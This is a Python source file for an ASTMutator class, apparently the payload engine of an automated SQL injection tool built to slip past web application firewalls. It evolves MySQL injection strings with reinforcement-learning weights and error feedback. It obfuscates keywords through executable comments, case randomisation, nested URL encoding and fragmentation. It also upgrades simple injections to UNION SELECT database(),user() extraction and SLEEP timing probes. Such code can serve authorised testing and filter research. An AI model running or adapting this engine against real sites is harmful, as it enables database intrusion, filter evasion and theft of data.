import random
import re

class ASTMutator:
    def __init__(self, context="GENERIC"):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION"]
        self.context = context
        # RL: Epsilon-Greedy parameters
        self.epsilon = 0.2  # Exploration rate
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling,
            "context_aware": self._context_aware_mutation,
            "directed_bypass": self._directed_keyword_mutation,
            "micro_fragmentation": self._micro_fragmentation,
            "nested_encoding": self._nested_encoding,
            "dynamic_structural": self._dynamic_structural_mutation,
            "upgrade_to_exfil": self._upgrade_to_exfil,
            "semantic_mutation": self._semantic_symbol_mutation
        }
        # Awareness: Track success of each strategy (Q-values)
        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
        # Gene Credit Assignment: Track reputation of each keyword
        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
        self.last_strategy_used = None
        self.stealth_mode = False

    def apply_hint(self, hint):
        """Applies AI-driven hints to strategy weights."""
        strategy = hint.get("strategy")
        if strategy in self.strategy_weights:
            self.strategy_weights[strategy] *= 5.0
            print(f"[*] Mutator: AI Hint Applied - Boosting {strategy}", flush=True)
        
        # Keyword specific hints
        target_kw = hint.get("target_keyword")
        if target_kw in self.keyword_reputation:
            self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
            print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)

    def _strip_wrappers(self, payload):
        """Isolate core gene: Strip known outer wrappers and terminators before mutation."""
        clean = payload
        # Strip front quotes/brackets, even if stacked (e.g. ')))) )
        clean = re.sub(r"^['\"]?\)?\)?\)?\)?\}?\]?", "", clean).lstrip()
        # Ensure we strip leading spaces and generic prefix junk like '))/*junk*/ 
        clean = re.sub(r"^(?:(?:/\*.*?\*/)?[\s'\")#;]+)+", "", clean)
        
        # Strip trailing terminators
        clean = re.sub(r"(--\s*-?|#|/\*|;%00).*$", "", clean).strip()
        return clean

    def mutate(self, payload, error_msg=None, intensity=1):
        # Isolation Stage: Separate the Wrapper from the Core Logic
        core_gene = self._strip_wrappers(str(payload))
        mutated = core_gene
        
        # 1. Error-Based Feedback: Apply specific fixes based on SQL error
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            
        # 2. Standard Mutations with RL (Epsilon-Greedy)
        num_mutations = random.randint(1, 2) * intensity
        
        for _ in range(num_mutations):
            names = list(self.strategies.keys())
            
            # Epsilon-Greedy Selection
            if random.random() < self.epsilon:
                strat_name = random.choice(names)
            else:
                current_weights = dict(self.strategy_weights)
                if self.stealth_mode:
                    current_weights["dynamic_structural"] *= 2.0
                    current_weights["micro_fragmentation"] *= 2.0
                
                weights = [current_weights.get(n, 1.0) for n in names]
                strat_name = random.choices(names, weights=weights, k=1)[0]
            
            self.last_strategy_used = strat_name
            # Safeguard: Don't mutate if it's already "too" mutated/large
            if len(mutated) > 500:
                continue
            mutated = self.strategies[strat_name](mutated)
            
        # 3. Contextual Compatibility Logic: Wrap the core safely (strictly once at the end)
        mutated = self._context_aware_wrap(mutated)
        return mutated

    def report_success(self, payload, score):
        """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
        # Detect if we are being blocked consistently
        if score <= 0.1:
            self.stealth_mode = True
            # Penalize keywords present in a blocked payload
            for kw in self.sql_keywords:
                if kw in payload.upper():
                    self.keyword_reputation[kw] -= 0.1
                    self.keyword_reputation[kw] = max(0.1, self.keyword_reputation[kw])
        else:
            self.stealth_mode = False
            # Reward keywords in a successful payload
            if score > 0.5:
                for kw in self.sql_keywords:
                    if kw in payload.upper():
                        self.keyword_reputation[kw] += 0.05
                        self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])

        if self.last_strategy_used and score > 0.5:
            # Reward the strategy
            if self.last_strategy_used not in self.strategy_weights:
                self.strategy_weights[self.last_strategy_used] = 1.0
            
            self.strategy_weights[self.last_strategy_used] += 0.1
            # Normalize to prevent runaway weights
            total = sum(self.strategy_weights.values())
            for k in self.strategy_weights:
                self.strategy_weights[k] /= total
                self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0

    def _directed_keyword_mutation(self, payload):
        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
        mutated = payload
        # Find keywords with low reputation in the current payload
        for kw, rep in self.keyword_reputation.items():
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and (rep < 0.8 or random.random() < 0.3):
                # Apply a bypass transformation
                bypasses = [
                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
                    lambda k: f"/*!{random.randint(40000, 60000)}{k}*/",
                    lambda k: "".join([f"%{ord(c):02x}" if random.random() < 0.4 else c for c in k]),
                    lambda k: f"({k})" if k in ["SELECT", "UNION", "AND", "OR", "XOR"] else k,
                    lambda k: "".join([c.swapcase() if random.random() < 0.5 else c for c in k])
                ]
                transform = random.choice(bypasses)
                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
        return mutated

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on SQL error messages."""
        error = error.lower()
        # Column count mismatch
        if "column" in error and ("count" in error or "match" in error):
            if "UNION SELECT" in payload.upper():
                # Add more columns to UNION
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # Quote mismatch or syntax error near quote
        if "syntax" in error and ("'" in error or '"' in error):
            if "'" in payload and not payload.endswith("-- -"): 
                return payload + "-- -"
            if '"' in payload and not payload.endswith("#"):
                return payload + "#"
            
        return payload

    def _upgrade_to_exfil(self, payload):
        """
        Combats Genetic Drift by forcing basic payloads (e.g., 1=1) to appended data exfiltration goals.
        This forces the evolution to test deeper execution.
        """
        original = payload.upper()
        # Clean current terminators if they exist
        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
        
        # Only upgrade if it's considered a relatively simple bypass
        if "SELECT" not in original and "UNION" not in original:
            exfil_options = [
                " UNION SELECT NULL,NULL-- -",
                " AND (SELECT 1)=1-- -",
                " UNION SELECT database(),user()-- -",
                " AND (SELECT SLEEP(1))=0-- -"
            ]
            return clean_payload + random.choice(exfil_options)
        return payload

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets).
           GRAMMAR-BASED FUZZING: Strictly adheres to the known insertion state to avoid syntax breaking.
           GENIUS TACTIC: Prioritize heavy terminator usage (--, #, %00) over balancing to truncate trailing SQL safely.
        """
        terminators = ["-- -", "#", ";%00", "/*"]
        # Weight the terminators heavily instead of trying to perfectly balance the right side
        chosen_term = random.choice(terminators) if random.random() < 0.8 else ""

        if self.context == "NUMERIC":
            return payload + chosen_term
            
        if self.context == "SINGLE_QUOTE":
            return "'" + payload + chosen_term
            
        if self.context == "DOUBLE_QUOTE":
            return '"' + payload + chosen_term
            
        if self.context == "SINGLE_QUOTE_PARENTHESIS":
            return "')" + payload + chosen_term

        # Generic Random Fallback
        if random.random() > 0.4: # Increased chance to apply wrappers in generic mode
            wrappers = [
                ("'", chosen_term),
                ('"', chosen_term),
                ("') ", chosen_term),
                ('") ', chosen_term)
            ]
            prefix, suffix = random.choice(wrappers)
            return prefix + payload + suffix
            
        return payload + chosen_term

    def _tokenize(self, payload):
        """A lexical analyzer exclusively designed for MySQL's dialect and idiosyncrasies."""
        token_specification = [
            ('EXEC_COMMENT', r"/\*![0-9]{5}.*?\*/"),       # Executable comment (MySQL specific)
            ('COMMENT',      r"/\*.*?\*/|--\s[^\n]*|#[^\n]*"), # Standard/MySQL comments (Note: -- needs space after)
            ('HEX_BIT',      r"0[xX][0-9a-fA-F]+|0[bB][01]+|[xX]'[0-9a-fA-F]+'|[bB]'[01]+'"), # Hex/Bit literals
            ('STRING',       r"'[^']*'|\"[^\"]*\""),       # MySQL allows both single and double quotes
            ('SYS_VAR',      r"@@[a-zA-Z_0-9]+"),          # System variables
            ('VAR',          r"@[a-zA-Z_0-9]+"),           # User variables
            ('KEYWORD',      r"\b(SELECT|UNION|ALL|OR|AND|XOR|WHERE|FROM|DATABASE|USER|VERSION|ORDER\s+BY|GROUP\s+BY|LIMIT|OFFSET|HAVING|SLEEP|BENCHMARK|CONNECTION_ID|LOAD_FILE|INTO\s+OUTFILE|DUMPFILE)\b"),
            ('NUMBER',       r"\b\d+(\.\d+)?([eE][+-]?\d+)?\b"), # MySQL numbers (integers, floats, scientific)
            ('OPERATOR',     r"<=>|:=|<=|>=|!=|<>|=|\+|-|\*|/|%|\|\||&&|<<|>>|&|\||\^|~|SOUNDS\s+LIKE|\bLIKE\b|\bIN\b|\bIS\b"),
            ('BACKTICK_ID',  r"`[^`]*`"),                  # MySQL identifiers surrounded by backticks
            ('IDENTIFIER',   r"\b[a-zA-Z_][a-zA-Z0-9_$]*\b"),
            ('SYMBOL',       r"[(),;.]"),
            ('WHITESPACE',   r"[ \t\n\r]+"),
            ('MISC',         r"."),
        ]
        tok_regex = '|'.join('(?P<%s>%s)' % pair for pair in token_specification)
        get_token = re.compile(tok_regex, re.IGNORECASE).match
        pos = 0
        tokens = []
        while pos < len(payload):
            match = get_token(payload, pos)
            if not match: break
            type_str = match.lastgroup
            val = match.group(type_str)
            tokens.append({"type": type_str, "value": val})
            pos = match.end()
        return tokens

    def _build_ast(self, tokens):
        """
        AST Builder: Converts a flat list of tokens into a hierarchical Abstract Syntax Tree.
        Groups into [CLAUSES] -> [EXPRESSIONS] -> [LITERALS/OPERATORS]
        """
        ast = {"type": "ROOT", "children": []}
        current_node = ast
        stack = []
        
        for tok in tokens:
            if tok['type'] == 'KEYWORD' and tok['value'].upper() in ['SELECT', 'UNION', 'WHERE', 'FROM', 'ORDER BY']:
                # New clause starts
                new_clause = {"type": "CLAUSE", "name": tok['value'].upper(), "children": [tok]}
                ast["children"].append(new_clause)
                current_node = new_clause
            elif tok['value'] == '(':
                # Start of expression/group
                new_group = {"type": "EXPRESSION_GROUP", "children": [tok]}
                current_node["children"].append(new_group)
                stack.append(current_node)
                current_node = new_group
            elif tok['value'] == ')':
                # End of expression
                current_node["children"].append(tok)
                if stack:
                    current_node = stack.pop()
            else:
                if "children" not in current_node:
                    current_node["children"] = []
                current_node["children"].append(tok)
                
        return ast

    def _traverse_and_mutate_ast(self, node):
        """Walks the AST and applies Grammar-Safe mutations based on the Semantic Dictionary."""
        result = ""
        
        # 2. Semantic Dictionary using MySQL Specific Dialect
        semantic_dict = {
            "OPERATORS": {
                "=": [" LIKE ", " IN ", " = ", "<=>"], # <=> is MySQL's null-safe equal mapping
                ">": [" >= ", " > "],
                "||": [" OR ", " || "],
                "&&": [" AND ", " && "],
                "!=": [" <> ", " != "]
            },
            "LOGICAL_FUNCTIONS": {
                "SLEEP": ["BENCHMARK(1000000,MD5(1))", "SLEEP"],
                "DATABASE": ["SCHEMA", "DATABASE()", "DATABASE"],
                "VERSION": ["@@VERSION", "VERSION()", "@@GLOBAL.version"],
                "USER": ["SYSTEM_USER()", "SESSION_USER()", "CURRENT_USER()", "USER()"]
            }
        }

        if isinstance(node, dict) and node.get("type") in ["ROOT", "CLAUSE", "EXPRESSION_GROUP"]:
            for child in node.get("children", []):
                result += self._traverse_and_mutate_ast(child)
            return result
            
        elif isinstance(node, dict) and "type" in node and "value" in node:
            t_type = node['type']
            val = node['value']
            
            # Semantic Mutation Logic
            if t_type == 'OPERATOR' and val in semantic_dict["OPERATORS"]:
                if random.random() < 0.3:
                    # Choose a functionally equivalent operator from the dictionary
                    val = random.choice(semantic_dict["OPERATORS"][val])
                    
            elif t_type == 'KEYWORD':
                upper_val = val.upper()
                if upper_val in semantic_dict["LOGICAL_FUNCTIONS"] and random.random() < 0.4:
                    val = random.choice(semantic_dict["LOGICAL_FUNCTIONS"][upper_val])
                elif random.random() < 0.6:
                    # Specific MySQL feature: Executable Comments
                    # These execute their contents in MySQL uniquely
                    ver = random.choice(["10000", "50000", "50100", "50500", "50700", "00000"])
                    val = f"/*!{ver}{val}*/"
                    
            elif t_type == 'STRING':
                # MySQL String tricks
                coin = random.random()
                if coin < 0.2:
                    # Hex conversion trick for purely string literals (like 'admin' -> 0x61646d696e)
                    inside = val[1:-1]
                    if re.match(r"^[a-zA-Z0-9_]+$", inside): # Only for simple strings
                        val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
                elif coin < 0.4 and len(val) > 4:
                    # Concatenation Evasion without CONCAT: 'adm' 'in' is valid MySQL
                    quote_char = val[0]
                    inside = val[1:-1]
                    mid = len(inside) // 2
                    val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
                    
            elif t_type == 'IDENTIFIER':
                # MySQL Identifier masking using `backticks`
                if not val.startswith("`") and random.random() < 0.4:
                    val = f"`{val}`"

            elif t_type == 'WHITESPACE':
                # Replaced spaces with arbitrary internal comments
                coin = random.random()
                if coin < 0.2:
                    val = "/**/"
                elif coin < 0.3:
                    val = "%0a"  # MySQL treats newlines implicitly as spaces in URL contexts
                    
            return val
        
        return ""

    def _semantic_symbol_mutation(self, payload):
        """Mutates based on true structural understanding (AST generation & traversal)."""
        tokens = self._tokenize(payload)
        ast = self._build_ast(tokens)
        return self._traverse_and_mutate_ast(ast)

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0", "0<=>0", "1<=>1", "0x31<=>0x31", "(SELECT 1)<=>1", "8=8"],
            r"1=2": ["false", "not true", "1<=>0", "0<=>1", "(SELECT 1)<=>0"],
            r"\bOR\b": ["||", "XOR", "OR 1<=>1", "OR true"],
            r"\bAND\b": ["&&", "AND 1<=>1"],
            r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1<=>1"],
            r"\btrue\b": ["1<=>1", "not 0", "XOR false", "(SELECT 1)"],
            r"\bfalse\b": ["1<=>2", "0", "NULL", "(SELECT 0)"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            if re.search(pattern, mutated, flags=re.IGNORECASE):
                mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        """Adds internal comments to fill space logic without breaking payload endpoints."""
        junk = ["bypass", "attack_unit", "audit", "waf_bypass", "X"*8, "1337", "sys"]
        coin = random.random()
        if coin < 0.5 and " " in payload:
            return payload.replace(" ", f"/*{random.choice(junk)}*/", 1)
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _context_aware_mutation(self, payload):
        """(Legacy name kept for strategy matrix) Structural Obfuscation:
           Obfuscates keywords without touching spaces or quotes that handles wrappers.
        """
        mutated = str(payload)
        
        # 1. Comment Wrapping: Wrap keywords or parts of the payload
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.3:
                    mutated = re.sub(rf'\b{kw}\b', f"/**/{kw}/**/", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    mutated = re.sub(rf'\b{kw}\b', f"/*!{kw}*/", mutated, flags=re.IGNORECASE)

        return mutated

    def _micro_fragmentation(self, payload):
        """Micro-Fragmentation: Splits the payload into small chunks stuffed with junk data."""
        if len(payload) < 5: return payload
        
        # Split into 3-5 random chunks
        num_chunks = random.randint(3, 6)
        chunk_size = max(1, len(payload) // num_chunks)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        junk_patterns = [
            "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
            "/*!*/", " "
        ]
        
        fragmented = ""
        for i, chunk in enumerate(chunks):
            fragmented += chunk
            if i < len(chunks) - 1:
                fragmented += random.choice(junk_patterns)
        
        return fragmented

    def _nested_encoding(self, payload):
        """Nested Encoding: Applies layers of encoding (URL, Hex, etc.) to parts of the payload."""
        import urllib.parse
        
        def to_url(s):
            return "".join([f"%{ord(c):02x}" for c in s])
            
        def double_url(s):
            # Correct double encoding: only encode the '%' characters of the first pass
            first_pass = to_url(s)
            return first_pass.replace("%", "%25")

        # Only encode keywords or specific parts to avoid breaking SQL syntax entirely
        mutated = payload
        for kw in self.sql_keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE) and random.random() < 0.4:
                # Pick a random encoding strategy
                enc_choices = ["url", "double_url", "mixed"]
                enc_type = random.choice(enc_choices)
                
                if enc_type == "url":
                    mutated = re.sub(rf'\b{kw}\b', to_url(kw), mutated, flags=re.IGNORECASE)
                elif enc_type == "double_url":
                    mutated = re.sub(rf'\b{kw}\b', double_url(kw), mutated, flags=re.IGNORECASE)
                elif enc_type == "mixed":
                    encoded_kw = "".join([to_url(c) if random.random() < 0.5 else c for c in kw])
                    mutated = re.sub(rf'\b{kw}\b', encoded_kw, mutated, flags=re.IGNORECASE)
                    
        return mutated

    def _dynamic_structural_mutation(self, payload):
        """Dynamic Structural Mutation: Avoids mechanical substitution by generating unique bypass patterns."""
        mutated = payload
        
        # 1. Dynamic Comment Injection (Non-standard patterns)
        def get_dynamic_comment():
            chars = "abcdefghijklmnopqrstuvwxyz0123456789"
            content = "".join(random.choices(chars, k=random.randint(2, 5)))
            patterns = [
                f"/**/", 
                f"/*{content}*/", 
                f"/*!{content}*/", 
                f"/*--{content}*/",
                f"/*#*/"
            ]
            return random.choice(patterns)

        # 2. Case Randomization (Bypasses simple regex)
        def randomize_case(word):
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in word])

        # Apply to keywords
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                # Don't just replace, mutate the structure
                options = [
                    lambda k: f"{randomize_case(k)}",
                    lambda k: f"{get_dynamic_comment()}{k}{get_dynamic_comment()}",
                    lambda k: k.replace(" ", get_dynamic_comment()),
                    lambda k: "".join([c + get_dynamic_comment() if random.random() < 0.3 else c for c in k])
                ]
                mutated = re.sub(rf'\b{kw}\b', random.choice(options)(kw), mutated, flags=re.IGNORECASE)
        
        return mutated
